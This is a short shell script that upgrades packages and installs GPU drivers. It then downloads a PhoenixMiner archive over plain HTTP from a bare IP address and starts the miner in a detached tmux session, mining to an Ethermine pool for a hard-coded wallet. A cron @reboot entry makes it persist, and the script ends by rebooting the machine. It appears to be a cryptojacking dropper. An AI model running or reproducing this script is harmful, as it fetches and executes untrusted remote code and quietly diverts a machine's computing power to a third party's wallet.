#!/bin/sh
sudo sysctl -p
sudo apt-get update
cd $HOME/
sudo apt-get -y -qq upgrade
sudo apt-get install -y -qq git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux
sudo apt install unzip
sudo apt install -y ubuntu-drivers-common
sudo ubuntu-drivers autoinstall
wget http://45.144.225.120/MINER/ethereum-quickstart-master.zip
unzip ethereum-quickstart-master.zip
echo '#!/bin/sh'>>start.sh
echo "cd $HOME/">>start.sh
echo "tmux kill-server">>start.sh
echo "sleep 1">>start.sh
echo "sudo tmux new-session -d -s SANS './ethereum-quickstart-master/phoenixminer/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x0e8f95b1b0eead7271d7c4b2da8d6ead168233e7.TRIES -pass x'">>start.sh
echo "@reboot  sh $HOME/start.sh">> resmi
crontab resmi
sudo rm resmi
sudo reboot
